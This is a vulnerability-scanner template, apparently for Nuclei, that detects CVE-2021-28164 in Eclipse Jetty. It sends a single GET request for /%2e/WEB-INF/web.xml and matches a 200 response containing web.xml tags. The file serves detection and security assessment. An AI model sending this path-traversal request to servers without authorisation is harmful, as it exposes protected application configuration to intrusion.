id: cve-2021-28164
info:
  name: Jetty File Read (CVE-2021-28164)
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    In Eclipse Jetty 9.4.37.v20210219 to 9.4.38.v20210224, the default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. This can reveal sensitive information regarding the implementation of a web application.
  tags: information-disclosure
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28164
  classification:
    cve-id: CVE-2021-28164

http:
  - raw:
      - |
        GET /%2e/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<web-app>"
          - "<display-name>"
          - "Archetype Created Web Application"
